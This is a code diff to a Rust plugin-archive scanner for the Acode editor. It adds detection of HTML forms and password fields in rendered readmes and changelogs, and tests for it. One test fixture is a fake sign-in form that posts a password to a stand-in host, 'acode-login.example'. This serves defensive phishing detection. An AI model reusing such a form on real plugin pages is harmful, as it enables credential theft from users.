@@ -1,11 +1,15 @@
 //! plugin.json handling that mirrors Acode's installer and the acode.app
 //! publish checks (`server/apis/plugin.js`).
 
+use std::sync::LazyLock;
+
+use regex::Regex;
 use serde_json::{Map, Value};
 
 use crate::{
     archive::{ArchiveFile, PluginArchive, extension, sanitize_zip_path},
     report::{Finding, PluginSummary, Report},
+    rules,
     severity::{Category, Severity},
 };
 
@@ -282,16 +286,91 @@ fn validate_assets(object: &Map<String, Value>, archive: &PluginArchive, report:
         Some(_) => {}
     }
 
-    if asset(object, archive, "readme", "readme.md").is_none()
-        && archive.by_key("README.md").is_none()
-    {
-        report.push(manifest_finding(
+    let readme =
+        asset(object, archive, "readme", "readme.md").or_else(|| archive.by_key("README.md"));
+    match readme {
+        Some(file) => check_rendered_markdown(file, report),
+        None => report.push(manifest_finding(
             "manifest.missing_readme",
             Severity::Medium,
             "No readme found (checked `readme` and readme.md); acode.app rejects the upload",
             "add readme.md",
-        ));
+        )),
     }
+    if let Some(file) = string_field(object, "changelogs").and_then(|path| archive.by_key(&path)) {
+        check_rendered_markdown(file, report);
+    }
+}
+
+static FORM_TAG: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)<form\b[^>]*>").expect("valid form pattern"));
+static PASSWORD_INPUT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?i)<input\b[^>]*\btype\s*=\s*["']?password"#).expect("valid input pattern")
+});
+static FORM_ACTION: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?i)\baction\s*=\s*["']?(https?:)?//([^"'\s/>]+)"#).expect("valid action pattern")
+});
+
+static CODE_SPAN: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(`+)[^`]*?(`+)").expect("valid code span pattern"));
+
+/// Drops fenced code blocks and inline code spans, which markdown-it renders
+/// as escaped text, so documented `<form>` examples don't count.
+fn strip_markdown_code(markdown: &str) -> String {
+    let mut out = String::with_capacity(markdown.len());
+    let mut fence: Option<&str> = None;
+    for line in markdown.lines() {
+        let trimmed = line.trim_start();
+        let marker = ["```", "~~~"]
+            .into_iter()
+            .find(|marker| trimmed.starts_with(marker));
+        match (fence, marker) {
+            (None, Some(marker)) => fence = Some(marker),
+            (Some(open), Some(marker)) if open == marker => fence = None,
+            (None, None) => {
+                out.push_str(&CODE_SPAN.replace_all(line, ""));
+                out.push('\n');
+            }
+            _ => {}
+        }
+    }
+    out
+}
+
+/// The plugin page renders the readme and changelog as HTML through DOMPurify,
+/// which keeps forms and inputs by default, so a readme can show a fake
+/// sign-in form inside Acode.
+fn check_rendered_markdown(file: &ArchiveFile, report: &mut Report) {
+    let text = strip_markdown_code(&String::from_utf8_lossy(&file.bytes));
+    let Some(form) = FORM_TAG.find(&text) else {
+        return;
+    };
+    let action_host = FORM_ACTION
+        .captures(form.as_str())
+        .and_then(|captures| captures.get(2))
+        .map(|host| host.as_str().to_ascii_lowercase());
+    let (id, severity, message) = if PASSWORD_INPUT.is_match(&text) {
+        (
+            "manifest.readme_password_form",
+            Severity::High,
+            "Readme or changelog renders a password form on the plugin page (phishing)",
+        )
+    } else {
+        (
+            "manifest.readme_form",
+            Severity::Medium,
+            "Readme or changelog renders an HTML form on the plugin page",
+        )
+    };
+    let evidence = match &action_host {
+        Some(host) => format!("{}: form posts to {host}", file.path),
+        None => format!("{}: {}", file.path, rules::shorten(form.as_str(), 120)),
+    };
+    report.push(
+        Finding::new(id, severity, Category::Manifest, message, evidence)
+            .with_file(file.path.clone())
+            .keyed(&file.path),
+    );
 }
 
 fn asset<'a>(
@@ -470,6 +549,46 @@ mod tests {
         assert!(!report.has("manifest.main_escapes_plugin_dir"));
         assert!(!report.has("manifest.main_loader_mismatch"));
         assert_eq!(manifest.unwrap().entry.as_deref(), Some("main.js"));
+    }
+
+    #[test]
+    fn flags_forms_in_rendered_readme() {
+        let json = manifest_with_main("main.js");
+        let phishing = b"# Setup\n<form action=\"https://acode-login.example/\"><input name=u><input type=password name=p><button>Sign in</button></form>";
+        let (_, report) = load_zip(&[
+            ("plugin.json", &json),
+            ("main.js", b""),
+            ICON,
+            ("readme.md", phishing),
+        ]);
+        assert!(report.has("manifest.readme_password_form"));
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|finding| finding.evidence.contains("acode-login.example"))
+        );
+
+        let json = br#"{"id":"com.example.ok","name":"Ok","main":"main.js","version":"1.0.0","changelogs":"CHANGELOG.md"}"#;
+        let (_, report) = load_zip(&[
+            ("plugin.json", json),
+            ("main.js", b""),
+            ICON,
+            README,
+            ("CHANGELOG.md", b"<form><input name=email></form>"),
+        ]);
+        assert!(report.has("manifest.readme_form"));
+
+        let (_, report) = load_zip(&[
+            ("plugin.json", &manifest_with_main("main.js")),
+            ("main.js", b""),
+            ICON,
+            (
+                "readme.md",
+                b"Use `<form>` tags in **HTML** files.\n\n```html\n<input type=\"text\">\n```",
+            ),
+        ]);
+        assert!(!report.has("manifest.readme_form"));
     }
 
     #[test]
